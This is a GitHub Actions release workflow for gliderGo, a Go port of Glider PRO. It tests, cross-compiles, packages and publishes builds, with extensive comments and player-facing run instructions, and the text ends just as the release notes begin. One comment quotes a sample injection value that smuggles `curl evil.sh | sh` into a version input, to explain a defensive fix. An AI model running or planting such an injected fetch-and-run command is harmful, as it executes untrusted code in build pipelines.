# gliderGo release builds.
#
# HONEST CAVEAT, READ FIRST. Like ci.yml, this is written on an airgapped host that cannot
# reach github.com. Every command it invokes is verified locally -- `make check`, `make
# assets-check` and `make cross` all pass here, and the packaging steps below were rehearsed by
# hand against the same bin/cross/ layout `make cross` writes.
#
# It has run since: v0.1.0, v0.1.1 and v0.1.2 were built and published by it, and on 2026-09-29
# v0.2.0-rc1's run published a prerelease with SHA256SUMS and v0.2.0's was green first time.
# Whether any v0.1.x tag needed a correction is not recorded on this host, so this claims none.
# Every change since the last tag is unrun until the next one, so rehearse it first. Push an rc
# tag -- `git tag vX.Y.Z-rc1 && git push origin vX.Y.Z-rc1`, which publishes as a prerelease and
# can be deleted -- or use the workflow_dispatch entry below, which builds and uploads the archives
# as a run artifact and cannot create a Release from any ref, including a tag. RELEASING.md has the
# rest of what a tag needs.
#
# WHAT A RELEASE ARCHIVE CONTAINS, AND WHY IT IS SHAPED THIS WAY.
# Two binaries and the documents a stranger needs, and nothing else. The assets are inside the
# executables: assets/extracted.zip and assets/levels.zip are compiled in by //go:embed
# (assets/assets.go), so the art, the sounds, all 22 original houses and the ones written for this
# port travel in the binary itself and the working directory means nothing.
#
#     tar xzf glidergo-v0.2.0-linux-amd64.tar.gz
#     ./glidergo-v0.2.0-linux-amd64/glidergo
#
# from anywhere at all. The -art, -houses, -houseart, -sounds and -levels flags still take a
# directory, for a player who wants to run edited art or houses of their own; empty, which is the
# default, means the copy built in. (The plural -sounds is the directory; -sound is the 1994
# boolean, and -sound=false starts the game with no sound loaded at all.)
# Archives used to carry a copy of assets/extracted/ and had to be run from their own root; that
# was docs/IMPROVEMENTS.md 5.3, now closed. The cost is that both binaries carry the same 11 MiB,
# so an archive is bigger than it was even though it holds fewer files.
#
# WHICH BUILDS CAN ACTUALLY DRAW. Three of the six: linux/amd64 through X11, and both windows
# targets through GDI. The linux one is built with cgo against libX11; the windows ones need no
# cgo at all, because internal/platform/win32 is pure syscall. The remaining three -- both darwin
# targets and cross-compiled linux/arm64 -- resolve to the null backend (see `make cross`'s comment
# for the build-tag complements), which runs the whole game but shows nothing on screen, and those
# archives are named `-headless` so nobody downloads one expecting to play. macOS is stage 6.
#
# The windows archives used to carry a caveat the linux one did not -- that neither the backend nor
# the sound behind it had ever been executed. For windows-amd64 that is no longer true: v0.1.1 was
# run on Windows Server 2025 on a real interactive desktop, and the window's pixels matched a
# Linux-rendered frame exactly (docs/windows-first-run.md). On one player's laptop v0.2.0's window
# stayed white and drew only what moved, which fits a driver that drops large sends, and the bands
# and sweep meant to fix that have not run there (docs/IMPROVEMENTS.md 2.81). windows-arm64 keeps
# the caveat: the machine that ran the tests was x86-64, and nothing here has an ARM64 Windows.
# What is also no longer a gap is sound: internal/audio has a native waveOut driver, so an unzipped
# .exe plays without FFmpeg or anything else installed, and `-audio ffplay` is the way round it if
# the driver misbehaves (docs/IMPROVEMENTS.md 2.48). The release notes below say all of this in the
# reader's terms rather than the maintainer's.
#
# NOTHING HERE IS SIGNED, AND TWO OPERATING SYSTEMS SAY SO LOUDLY. This is the last thing between a
# download and the title screen, and until docs/IMPROVEMENTS.md 4.13 filed it neither the notes nor
# HOW-TO-RUN.txt mentioned it. An unsigned .exe with no download history gets Defender SmartScreen's
# "Windows protected your PC", whose only visible button is Don't run -- Run anyway is behind More
# info, which is a click a first-time player has no reason to make. Explorer also copies a
# downloaded zip's Mark of the Web onto every file it extracts, so the dialog returns after it has
# been dismissed once. On macOS a download carries com.apple.quarantine, and Archive Utility passes
# it to what it unpacks while `tar xzf` does not. Three OS behaviours, none of them a bug in this
# program, all three indistinguishable from one.
#
# So the notes and the two HOW-TO-RUN.txt variants now name each of them and give the click path.
# Not signing is a decision and not an omission: a certificate costs a few hundred dollars a year
# and has to be issued to a named person or company, which is a thing to do deliberately rather than
# because a dialog was annoying, and SHA256SUMS is already published for anyone who wants to check
# what is in the archive rather than who vouched for it. The whole price of not signing: SmartScreen
# reputation belongs to a signer, or else to one file, so every tag's binaries start with none, and
# a Defender false positive cleared for one tag has to be cleared again for the next
# (docs/IMPROVEMENTS.md 5.12).
#
# Defender Antivirus is the fourth thing, and not one of the three: it does look at the contents,
# and it quarantines with no dialog. The notes and the Windows HOW-TO-RUN.txt say what that looks
# like and how to check and restore the file (5.12, step 3).
#
# Unverified, and differently from the rest of this file. The other caveats here are about GitHub,
# which this host cannot reach; these are about client machines nobody here has. The Windows half
# can be rehearsed offline by anyone with a Windows box, because a browser download is only a file
# with one alternate data stream on it:
#
#     Set-Content -Path .\glidergo.exe -Stream Zone.Identifier -Value "[ZoneTransfer]`nZoneId=3"
#
# then double-click it in Explorer. Worth doing before every tag, and v0.2.0 went without it
# (docs/PLAN.md §4, step 6). It is the one caveat in this file that does not need the network to
# test.

name: Release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      version:
        description: "Version string to stamp into the binaries (e.g. v0.0.0-test). Not tagged, not released."
        required: true
        default: v0.0.0-test

# Read by default; the publish job below opts into `contents: write` for itself alone, so a
# compromised build step cannot create a release or move a tag.
permissions:
  contents: read

# One release per tag, and never two at once: a re-pushed tag would otherwise race two runs
# uploading the same asset names.
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

env:
  # The repo's defaults, restated so a release log shows them. gliderGo is standard library
  # only -- internal/module asserts it -- so `off` should never bite; if it does, that is the
  # news, and it is better heard here than in a shipped binary.
  GOPROXY: "off"
  GOTOOLCHAIN: local
  # The Go a release is built with: a minor Go still patches, and not go.mod's `go 1.23`, which
  # is the oldest that can build the code (docs/IMPROVEMENTS.md 5.11). ci.yml's env says why at
  # length, and the two lines move together. check-latest takes the newest patch, and the notes
  # below name the one this run got. Moving the minor moves the oldest macOS and Windows a
  # release runs on, so the notes, README and both HOW-TO-RUN.txt texts are re-read with it.
  GO_RELEASE: "1.27.x"

jobs:
  # ---------------------------------------------------------------------------
  # Nothing ships untested.
  #
  # This job is not redundant with ci.yml: that workflow triggers on `push: branches` and on
  # pull_request, and a tag push is neither, so tagging runs no tests at all unless this job
  # does. Shipping a binary that no suite ever saw is the failure this exists to prevent.
  # ---------------------------------------------------------------------------
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5

      # libx11-dev is a hard requirement, not a nicety: with cgo on, `vet` and `test` compile
      # internal/platform/backend, which resolves to the x11 file, and without pkg-config
      # metadata the build fails with pkg-config's error rather than the Makefile's. xvfb is
      # for the on-screen bench.
      - name: Install C dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
            build-essential pkg-config libx11-dev xvfb

      # GO_RELEASE, the Go `build` uses: the suite a release is tested with is the one it is
      # built with. ci.yml's `check` covers go.mod's floor.
      - uses: actions/setup-go@v6
        with:
          go-version: ${{ env.GO_RELEASE }}
          check-latest: true
          cache: false

      - name: Report the environment
        run: make doctor

      # No tag past a known vulnerability that a shipped binary reaches (docs/IMPROVEMENTS.md
      # 5.11). ci.yml's `vuln` job runs this weekly and says more; here a finding stops the
      # release. The install is the one step that reaches a proxy, and it writes no `require`.
      - name: Install govulncheck
        env:
          GOPROXY: https://proxy.golang.org
        run: go install golang.org/x/vuln/cmd/govulncheck@v1.8.0

      - name: govulncheck, as each operating system a release ships for
        run: |
          go version
          for goos in linux windows darwin; do
            echo "::group::GOOS=$goos"
            GOOS=$goos "$(go env GOPATH)/bin/govulncheck" ./...
            echo "::endgroup::"
          done

      # There are two committed copies of the 1994 assets and this job needs both. extracted.zip is
      # what goes into the binaries, so a build without it is an empty window -- the Makefile's
      # `embedded` guard refuses that, and so does this, earlier and with the archive named.
      # extracted/ is the working tree, which is what `make assets-check` re-extracts against and
      # what the pixel corpus and the house round-trip read by path; lose it and those targets
      # skip, `make check` goes green, and nothing has compared a pixel. `go test ./assets`,
      # inside `make check`, is what proves the two copies still hold the same bytes.
      #
      # levels.zip is the third file and the port's own houses. It is committed and cannot be
      # regenerated from a checkout that lost it -- `make levels` needs bin/glidertool and
      # glidertool embeds this archive -- so naming it here is the whole of the remedy.
      - name: Refuse a checkout that is missing its assets
        run: |
          test -s assets/extracted.zip
          test -s assets/levels.zip
          test -s assets/extracted/art/manifest.json
          test -s assets/extracted/sound/manifest.tsv
          ls assets/extracted/houses/*.house >/dev/null

      - name: make check
        run: make check OUT="$RUNNER_TEMP"

      # And that the archive is the houses as authored, not a build somebody forgot to repack.
      #
      # `make check` covers this twice over -- `go test ./assets` compares the members against
      # levels/*.house.txt and `make levels` compares them against the directory it just built --
      # so this step is belt and braces, named separately because it is the one failure whose
      # consequence is a shipped release quietly holding last week's level. It reads the tree
      # `make check` left behind and writes nothing.
      - name: Verify the embedded houses against the text they are authored in
        run: go run ./tools/packassets -tree assets/levels -out assets/levels.zip -check

      # Proves the committed assets are still exactly what the extractor produces from
      # GliderPRO/ -- so a release ships art nobody hand-edited.
      - name: Verify the committed assets against their 1994 source
        run: make assets-check OUT="$RUNNER_TEMP"

      - name: On-screen bench under Xvfb
        run: xvfb-run -a -s '-screen 0 2600x1980x24' make bench

  # ---------------------------------------------------------------------------
  # Build every target, package each one, checksum the lot.
  #
  # One job rather than a matrix: `make cross` already builds all seven binaries on one Linux
  # runner in seconds, and a matrix would mean seven upload/download round trips to reassemble
  # a single SHA256SUMS file. The trade-off is that the darwin and windows archives are
  # cross-compiled and never executed here -- ci.yml's `native` job is what runs their tests.
  # ---------------------------------------------------------------------------
  build:
    needs: verify
    # Pinned, because this job builds the linux-amd64 binary and the runner's glibc sets the
    # oldest glibc it will start on. 24.04 gives the 2.34 README states; 22.04 and Debian 12 give
    # the same, so neither would lower it. The step after `make cross` checks the result.
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    # The version this job resolved, so `publish` names the release after the string that is
    # actually stamped into the binaries and the archive filenames instead of deriving a second
    # one of its own. On a tag push the two are identical; anywhere else they are not, and the
    # release would then advertise a filename it did not attach.
    outputs:
      version: ${{ steps.v.outputs.version }}
      go: ${{ steps.go.outputs.version }}
    steps:
      # fetch-depth: 0 because the Makefile's VERSION comes from `git describe --tags`. A
      # shallow checkout has the tag but no history behind it, and describe then answers with
      # something other than the tag. VERSION is passed explicitly below anyway; the full
      # history keeps `make doctor` and any incidental describe honest.
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - name: Install C dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
            build-essential pkg-config libx11-dev

      - uses: actions/setup-go@v6
        with:
          go-version: ${{ env.GO_RELEASE }}
          check-latest: true
          cache: false

      # Which Go this run got, for the notes: GO_RELEASE names a minor, and the patch is
      # whatever was newest when the job ran. `go version -m glidergo` reads the same string out
      # of the binary.
      - name: Record the Go
        id: go
        run: echo "version=$(go env GOVERSION)" >> "$GITHUB_OUTPUT"

      # The tag for a tag push, the dispatch input for a manual run. Stamped into every binary
      # via the Makefile's -X main.version, so `glidergo -version` and the title screen agree
      # with the release it came from. Passed explicitly rather than left to `git describe` so
      # that a manual run is stamped with something meaningful too.
      #
      # The dispatch input arrives through `env:` rather than `${{ }}` inside the script, and
      # that is not a style choice: `${{ }}` is textual substitution performed before bash sees
      # a single character of this, so `version='${{ inputs.version }}'` with an input of
      # `v1'; curl evil.sh | sh; x='` renders as valid shell and runs it -- in the job that
      # holds the checkout and builds what the release ships. Through `env:` the value is data.
      #
      # The allowlist then narrows it to what the rest of the pipeline can actually survive:
      # `$version` becomes a `-ldflags` argument, six directory names and six archive names, so
      # a space, a slash or a quote in it breaks the build or produces files nobody can name.
      # Anchored, because an unanchored `v[0-9]*` admits every one of those.
      - name: Resolve the version
        id: v
        env:
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
            version="$INPUT_VERSION"
          else
            version="$GITHUB_REF_NAME"
          fi
          if [ -z "$version" ]; then
            echo "::error::could not resolve a version"
            exit 1
          fi
          if [[ ! "$version" =~ ^v[0-9][A-Za-z0-9.+_-]*$ ]]; then
            echo "::error::version must look like v1.2.3, got '$version'"
            exit 1
          fi
          echo "version=$version" >> "$GITHUB_OUTPUT"
          echo "Building $version"

      # This job needs only the archives: it packages binaries, and the binaries are the assets.
      # `make cross` refuses without them too (the Makefile's `embedded` target), but a named
      # failure here is a clearer thing to read in a release log than a build that stopped.
      - name: Refuse a checkout that is missing the archives the binaries embed
        run: |
          test -s assets/extracted.zip
          test -s assets/levels.zip

      # Writes bin/cross/glidergo-$os-$arch[.exe] and glidertool-$os-$arch[.exe] for the six
      # CGO_ENABLED=0 targets, plus bin/cross/glidergo-linux-amd64-x11 for the host's own cgo
      # build. `make cross` exits non-zero if any of them fails, including the x11 one, so this
      # step is the gate on "every target a release ships still compiles".
      - name: Cross-compile every release target
        env:
          VERSION: ${{ steps.v.outputs.version }}
        run: make cross VERSION="$VERSION"

      # The glibc floor README, the notes and HOW-TO-RUN.txt state, checked on the binary that
      # ships. The pin above keeps the runner's side of it. A code change can still raise it on an
      # unchanged runner: one C call that a newer header maps to a newer symbol, as strtol becomes
      # __isoc23_strtol@GLIBC_2.38, and a pin cannot see that (IMPROVEMENTS 5.4).
      - name: Hold the Linux archive to the glibc floor it states
        run: |
          set -euo pipefail
          floor=2.34
          got=$(objdump -T bin/cross/glidergo-linux-amd64-x11 | grep -o 'GLIBC_[0-9.]*' | sed 's/^GLIBC_//' | sort -uV | tail -1)
          echo "the linux-amd64 binary needs glibc $got; the documents say $floor"
          if [ "$(printf '%s\n%s\n' "$got" "$floor" | sort -V | tail -1)" != "$floor" ]; then
            echo "::error::the linux-amd64 binary needs glibc $got, and README, the notes and HOW-TO-RUN.txt say $floor"
            exit 1
          fi

      # The claim every archive below rests on, tested rather than asserted: one binary, alone in
      # an empty directory, with no asset tree anywhere near it and a working directory that means
      # nothing. `-version` reports what it found and `-shot` makes it actually decode the art and
      # composite a screen, which is the difference between "the archive opened" and "the game is
      # in there". The CGO_ENABLED=0 build is the one used because it needs no libX11 and `-shot`
      # needs no display; both are true of the x11 build as well, but this way the step tests the
      # binary that has the least beside it.
      - name: Prove a binary needs no files beside it
        run: |
          set -euo pipefail
          # What the checkout holds, counted here while the repository is still the working
          # directory: the 1994 houses in the committed tree, plus one per authored level. The
          # binary is then asked how many it can see, and the two have to agree. Derived rather
          # than written as "23" so that adding a house does not require editing this file -- and
          # so that the assertion stays the one worth making, which is that nothing was left
          # behind by the packing.
          want=$(( $(ls assets/extracted/houses/*.house | wc -l) + $(ls levels/*.house.txt | wc -l) ))
          empty="$(mktemp -d)"
          cp bin/cross/glidergo-linux-amd64 "$empty/glidergo"
          cd "$empty"
          ./glidergo -version
          ./glidergo -shot title.png
          test -s title.png
          # The house picker is the one screen that answers "which houses did it bring". It
          # prints `N houses, M skipped`, and a release that shipped the originals while quietly
          # leaving the port's own house behind passes every line above this one.
          ./glidergo -shot houses.png -shot-screen houses 2>&1 | tee picker.txt
          grep -q "$want houses, 0 skipped" picker.txt
          test -s houses.png

      # Package one directory per target: the two binaries at the root and the documents a
      # stranger needs. No asset tree -- see the header.
      #
      # linux/amd64 gets the cgo x11 binary rather than the CGO_ENABLED=0 one, so the archive a
      # Linux player downloads is the playable one. The two windows archives are playable from
      # the plain cross-build, because win32 needs no cgo. The other three get the null-backend
      # build and are named `-headless`, because an archive that silently shows nothing is worse
      # than one that says so in its filename.
      - name: Package the archives
        id: pkg
        env:
          VERSION: ${{ steps.v.outputs.version }}
        run: |
          set -euo pipefail
          mkdir -p dist

          # target|binary-suffix|archive-suffix|format
          #   binary-suffix picks which bin/cross/ build goes in, since linux-amd64 has two.
          targets='
          linux-amd64|-x11||tar
          linux-arm64||-headless|tar
          darwin-amd64||-headless|tar
          darwin-arm64||-headless|tar
          windows-amd64|||zip
          windows-arm64|||zip
          '

          for row in $targets; do
            IFS='|' read -r target binsuf arcsuf format <<EOF
          $row
          EOF
            name="glidergo-${VERSION}-${target}${arcsuf}"
            stage="dist/$name"
            mkdir -p "$stage"

            exe=""
            case "$target" in windows-*) exe=".exe" ;; esac

            cp "bin/cross/glidergo-${target}${binsuf}${exe}"  "$stage/glidergo${exe}"
            cp "bin/cross/glidertool-${target}${exe}"         "$stage/glidertool${exe}"

            # The README's sixteen links into docs/ would every one of them 404 inside an archive
            # that carries no docs/ -- three of them the screenshots at the very top, which is
            # the first thing anyone opening it sees. Shipping 9.2 MB of development notes six
            # times over to fix that is the wrong trade; rewriting the links is the right one.
            #
            # Both branches have now been run, against the same bin/cross/ layout the step above
            # writes: the three screenshots come out as /raw/ and the thirteen documents as /blob/,
            # every one pinned at a 40-character SHA, and the assertion below finds nothing left
            # behind (docs/IMPROVEMENTS.md 4.13). The count in the paragraph above is the one thing
            # here that will rot; the assertion is what actually holds, and it counts nothing.
            #
            # Pinned at the commit built from rather than at a branch, so they resolve to the
            # source these exact binaries were compiled from however far the default branch
            # moves afterwards. Screenshots first: theirs is the narrower pattern, and they need
            # /raw/ to render rather than /blob/.
            #
            # The root documents the archive does not carry go the same way. SECURITY.md is linked
            # from the racing section, and it 404ed inside every archive until this line.
            base="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}"
            sed -E \
              -e "s#\]\((docs/screenshots/[^)]*)\)#](${base}/raw/${GITHUB_SHA}/\1)#g" \
              -e "s#\]\((docs/[^)]*)\)#](${base}/blob/${GITHUB_SHA}/\1)#g" \
              -e "s#\]\((SECURITY|CONTRIBUTING|RELEASING)\.md\)#](${base}/blob/${GITHUB_SHA}/\1.md)#g" \
              README.md > "$stage/README.md"
            cp LICENSE CHANGELOG.md "$stage/"
            mkdir -p "$stage/GliderPRO"
            cp "GliderPRO/README.md"        "$stage/GliderPRO/README.md"
            cp "GliderPRO/GPLv2-LICENSE.md" "$stage/GliderPRO/GPLv2-LICENSE.md"

            # Both binaries have the Go runtime and standard library compiled in, and that code is
            # BSD-3-Clause: a binary redistribution must reproduce its notice (docs/IMPROVEMENTS.md
            # 1.4). Read from GOROOT rather than committed, because under GOTOOLCHAIN: local that is
            # the toolchain that built these exact binaries, so the notice cannot drift from them.
            {
              echo "glidergo and glidertool have $(go env GOVERSION)'s runtime and standard library compiled in."
              echo "That code is distributed under the licence below. gliderGo's own licence is in LICENSE."
              echo
              cat "$(go env GOROOT)/LICENSE"
            } > "$stage/THIRD-PARTY-NOTICES.txt"

            # How to actually start it, next to the thing you just unpacked. Written for the
            # only reader who matters here: somebody who has this archive open and does not
            # know that three of the six cannot draw, or that one of the three that can
            # (windows-arm64) has never been run on a machine of its own architecture.
            #
            # A headless archive must NOT tell its reader to run the bare binary. The null
            # backend delivers no quit event, and without -frames the shell loop has no exit
            # condition, so `./glidergo` prints one line and then spins on an invisible title
            # screen until Ctrl-C. Both commands below were run against an unpacked archive
            # and both exit 0 with something to show for it.
            #
            # The heredoc bodies sit flush with the block scalar's own indentation -- that is
            # what puts them at column 0 in the script the runner executes, the same reason the
            # `read` heredoc above is written that way. Unquoted terminator, so ${cmd} expands.
            #
            # ${cmd} carries the `./`, and it is not decoration: an unpacked archive is not on
            # anybody's PATH, so a bare `glidergo` is "command not found" in every Unix shell,
            # and a bare `glidergo.exe` is the same in PowerShell -- which is the shell a Windows
            # reader is most likely to have open. `.\` works in PowerShell and in cmd.exe both.
            # Assigned in single quotes so the backslash needs no escaping.
            case "$format" in
              zip) cmd='.\glidergo.exe' ;;
              *)   cmd='./glidergo' ;;
            esac

            if [ -n "$arcsuf" ]; then
              cat > "$stage/HOW-TO-RUN.txt" <<TXT
          This build has no window backend yet. It runs the whole game -- physics, rooms,
          scoring, sound -- but it cannot draw to a screen, so starting it with no arguments
          leaves you looking at nothing, with no way out but Ctrl-C. That is expected, and it
          is why this archive is named "headless".

          Two things it will do. Open a terminal in this directory and run:

              ${cmd} -shot title.png
                  Writes the title screen to title.png, and exits.

              ${cmd} -house Slumberland -frames 300 -dump frames
                  Plays 300 frames of a house, writes each one into frames/ as a PNG,
                  and reports the score it reached.

          Neither one needs any file beside it. The art, the sounds, all 22 of John Calhoun's
          houses and the ones written for this port are inside the binary, so glidergo can be
          moved anywhere and run from any directory.

          The linux-amd64 and windows archives do draw. On Linux arm64, building from source on
          the machine itself gives you the X11 backend -- this archive is headless only because
          it was cross-compiled without cgo. macOS is stage 6. See README.md.
          TXT
            elif [ "$format" = zip ]; then
              cat > "$stage/HOW-TO-RUN.txt" <<TXT
          Open PowerShell or Command Prompt in this directory and run:

              ${cmd}

          Double-clicking glidergo.exe in Explorer works too, and so does copying it wherever you
          keep programs: everything the game needs -- the art, the sounds, all 22 of the 1994
          houses and the ones written for this port -- is inside the .exe, which is why it is
          16 MB. A console window opens alongside the game; that is where it says which house it
          loaded and what it could not find. If the game stops with an error, that window should
          wait for Enter before it closes, which has not been tried on Windows yet. If it crashes,
          the report is kept in %AppData%\glidergo\crash-last.log, and the next start says so.

          It needs Windows 10 or 11, or Windows Server 2016 or newer. An older Windows will not
          start it: the Go it is built with has dropped Windows 7 and 8, and the .exe says so in
          its header.

          ONE THING TO EXPECT ON WINDOWS.

          The code behind this has had far less wear than the Linux equivalent: the window, the
          keyboard and the sound were all written on Linux, which cannot run any of them. Its
          x86-64 builds have been run on Windows Server 2025, where the screens came out pixel for
          pixel the same as on Linux. On one Windows 10 laptop v0.2.0's window stayed white and
          drew only what moved. This one sends its picture in smaller pieces because of it, and
          has not been tried on that laptop. Nobody has steered a glider through a house on
          Windows by hand, and the arm64 build has never run at all. A bug report with
          crash-last.log or the console output in it is worth a lot. See README.md.

          Sound needs nothing installed -- the game talks to Windows' own audio directly. If it
          is silent or stutters, "${cmd} -audio list" shows what this machine has, "${cmd}
          -audio ffplay" uses FFmpeg instead if you have it, and "${cmd} -wav out.wav" writes
          what you should have heard to a file.

          IF WINDOWS REFUSES TO OPEN IT AT ALL.

          Two things happen to a file that came from the internet, and neither is a fault in
          this program.

          A blue "Windows protected your PC", whose only visible button says Don't run: that is
          Defender SmartScreen, and every unsigned program with no download history gets it.
          Click More info, then Run anyway. There is no Run anyway button until you do.

          The quieter one is Mark of the Web. Windows tags a downloaded zip and Explorer copies
          the tag onto every file it extracts, so the dialog can come back after you got past
          it once. Right-click the zip before extracting, Properties, tick Unblock, OK -- or run
          this in this directory afterwards:

              Get-ChildItem -Recurse | Unblock-File

          Neither of those two judges what the program does. They are about who signed
          it, and nobody did. SHA256SUMS on the release page is the check on the contents.

          IF GLIDERGO.EXE HAS DISAPPEARED.

          That is Microsoft Defender Antivirus, a different part of Windows from
          SmartScreen, and it does not ask first. If it decides a file is malware it
          quarantines it, as the zip is extracted or on the first double-click: this
          directory has no glidergo.exe in it, or a double-click does nothing and a
          "Threats found" notification appears. A detection name ending in !ml is a
          machine-learning model's guess, not a match against known malware.

          Check the download first. SHA256SUMS has a line for the zip, not for the .exe
          inside it, so in PowerShell, in the directory the zip is in, run

              Get-FileHash ${name}.zip

          and compare what it prints with that line. It prints capitals and SHA256SUMS
          does not; the characters are otherwise the same. If they match, open Windows
          Security, Virus & threat protection, Protection history, pick the entry,
          then Actions, then Restore. That needs an administrator. Then please open an
          issue that quotes the detection name exactly.

          RACING ANOTHER MACHINE.

          The machine that hosts a race has to let the other one in, and Windows asks first.
          The first time you choose Host, a "Windows Defender Firewall has blocked some
          features" dialog comes up. Tick the kind of network you are on -- Private for a home
          network -- and click Allow access. Cancel is remembered as a no: the other player
          then sees "no answer" and, after a few tries, a line naming a firewall. To undo it,
          open Windows Security, Firewall & network protection, "Allow an app through
          firewall", and tick glidergo for your network. Joining needs no permission.
          README.md has racing beyond your own network.
          TXT
            else
              cat > "$stage/HOW-TO-RUN.txt" <<TXT
          Open a terminal in this directory and run:

              ${cmd}

          It needs no files beside it. The art, the sounds, all 22 of the 1994 houses and the
          ones written for this port are inside the binary, which is why it is 16 MB, so you can
          copy glidergo to ~/bin or /usr/local/bin and run it from anywhere. Linux needs glibc
          2.34 or newer (Ubuntu 22.04, Debian 12, Fedora 35, RHEL 9 or later), libX11 at run
          time -- libx11-6, which every desktop install already has -- and a 24- or 32-bit
          display.

          Sound goes through whichever of pw-play, paplay or aplay is installed; ffplay and
          SoX's play work too. "${cmd} -audio list" shows what it found. With none of them, the
          game says so once and plays in silence.

          If it crashes, the report is kept in ~/.local/share/glidergo/crash-last.log, and the
          next start says so. That file is the one to attach to a bug report.
          TXT
            fi

            # One more paragraph if this archive is going to a Mac, and only then: the headless
            # text above is shared with linux-arm64, whose reader has no Gatekeeper to hit and no
            # reason to be told about one. Appended rather than branched into the heredoc so the
            # three-way if stays about what the build can draw, which is what it is sorted by.
            case "$target" in
            darwin-*) cat >> "$stage/HOW-TO-RUN.txt" <<TXT

          It needs macOS 13 (Ventura) or newer, which is the oldest the Go it is built with
          supports.

          ONE THING macOS DOES TO DOWNLOADS.

          A file from a browser carries com.apple.quarantine, and how you unpack this decides
          whether ${cmd} inherits it. Double-clicking the .tar.gz in Finder hands it to Archive
          Utility, which passes the attribute on; "tar xzf" in a terminal does not, because the
          attribute is on the archive file rather than stored inside it. So unpack it in a
          terminal. If you have already met "cannot be opened because the developer cannot be
          verified", this clears it:

              xattr -d com.apple.quarantine glidergo

          Nothing here is signed, which is what that message is about. It is not a check on what
          is in the archive; SHA256SUMS on the release page is that.
          TXT
            ;;
            esac

            # CRLF for an archive Windows will unpack, so Notepad shows lines and not one line.
            if [ "$format" = zip ]; then
              sed -i 's/$/\r/' "$stage/HOW-TO-RUN.txt" "$stage/THIRD-PARTY-NOTICES.txt"
            fi

            # Every archive is verified to hold a binary with its assets in it before it is
            # sealed. A stale bin/cross/ or a `cp` that silently did nothing would otherwise ship.
            #
            # Grepping an executable is the check that works for all six targets: zip stores its
            # member names uncompressed, so the built-in tree's own filenames are literal bytes in
            # every one of these binaries, including the windows and darwin builds this runner
            # cannot execute. The step above already ran the linux one for real.
            test -x "$stage/glidergo${exe}"
            grep -qa "houses/Demo House.house" "$stage/glidergo${exe}"
            grep -qa "sound/manifest.tsv"      "$stage/glidergo${exe}"

            # The second archive, by the name of every house authored for this port. Taken from
            # levels/ rather than written out, so a new house is covered the day it is committed
            # and this file needs no edit. It is the only check the five non-executable targets
            # get on the levels root at all.
            for src in levels/*.house.txt; do
              grep -qa "$(basename "$src" .txt)" "$stage/glidergo${exe}"
            done

            # And that the link rewrite above actually fired. A README whose sed silently missed
            # ships broken images to every downloader, which is exactly the kind of failure
            # nobody reports. An `if` and not `! grep`: set -e ignores a command whose status is
            # inverted with `!`, so the bare form could never fail this step.
            if grep -q '](docs/' "$stage/README.md"; then
              echo "$name: README.md still links into docs/" >&2
              exit 1
            fi
            # Every relative link left is to a file the archive carries: CHANGELOG.md and LICENSE.
            for rel in $(grep -oE '\]\([^):#]+\)' "$stage/README.md" | sed -E 's/^\]\((.*)\)$/\1/' | sort -u); do
              if [ ! -e "$stage/$rel" ]; then
                echo "$name: README.md links to $rel, which the archive does not carry" >&2
                exit 1
              fi
            done

            # And that Go's licence went in. A runner toolchain with no LICENSE, or a later edit
            # that drops the file, fails the build here instead of shipping an archive that owes a
            # notice it does not carry. The pattern leaves out go1.23's "(c)": the 2024 wording,
            # which the x/telemetry copy vendored in go1.23.12 already has, is "Copyright 2009 The
            # Go Authors.", and a newer release toolchain is expected (IMPROVEMENTS 5.11).
            grep -q '2009 The Go Authors' "$stage/THIRD-PARTY-NOTICES.txt"

            case "$format" in
              tar) tar -C dist -czf "dist/${name}.tar.gz" "$name" ;;
              zip) (cd dist && zip -qr "${name}.zip" "$name") ;;
            esac
            rm -rf "$stage"
            echo "  packaged $name"
          done

          # One checksum file for the whole release, with bare filenames so that
          # `sha256sum -c SHA256SUMS` works in the directory a browser downloaded them into.
          (cd dist && sha256sum ./*.tar.gz ./*.zip | sed 's| \./| |' > SHA256SUMS)
          echo "--- dist ---"
          ls -l dist
          cat dist/SHA256SUMS

      # Verifies the checksum file against the archives it just described, and proves each
      # archive actually unpacks. A corrupt upload is not worth discovering from a bug report.
      - name: Verify the archives and their checksums
        run: |
          set -euo pipefail
          (cd dist && sha256sum -c SHA256SUMS)
          for f in dist/*.tar.gz; do tar -tzf "$f" >/dev/null; echo "  ok $f"; done
          for f in dist/*.zip;    do unzip -qt "$f";            echo "  ok $f"; done

      - uses: actions/upload-artifact@v6
        with:
          name: release-archives
          path: dist/
          retention-days: 14
          if-no-files-found: error

  # ---------------------------------------------------------------------------
  # Publish. Separate from `build` so that `contents: write` is scoped to the one job that
  # needs it, and so a manual workflow_dispatch run can build archives without ever being able
  # to create a release.
  #
  # Both halves of the `if` are load-bearing. A tag check alone is not enough: the "Run
  # workflow" ref picker and the REST dispatch endpoint both accept a tag, so dispatching
  # against `v1.2.3` makes github.ref `refs/tags/v1.2.3` and a tag-only gate opens. That run
  # would publish a release named after the tag while every asset in it was named and stamped
  # with the dispatch input instead -- a release whose own instructions name a file it does not
  # contain. Requiring the push event is what makes the dispatch path unable to publish at all.
  # ---------------------------------------------------------------------------
  publish:
    needs: build
    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v5

      - uses: actions/download-artifact@v7
        with:
          name: release-archives
          path: dist

      - name: Write the release notes
        env:
          VERSION: ${{ needs.build.outputs.version }}
          BUILTWITHGO: ${{ needs.build.outputs.go }}
        run: |
          set -euo pipefail
          # The notes name the Go that built the binaries, so a build job that did not say which
          # is a failure here rather than a sentence with a hole in it.
          test -n "$BUILTWITHGO"
          cat > notes.md <<'HEADER'
          A Go port of Glider PRO, John Calhoun's 1994 Macintosh game. One file, nothing to
          install: the original art, the sounds, all 22 of the 1994 houses and the ones written
          for this port are inside the binary, which is why it is 16 MB.

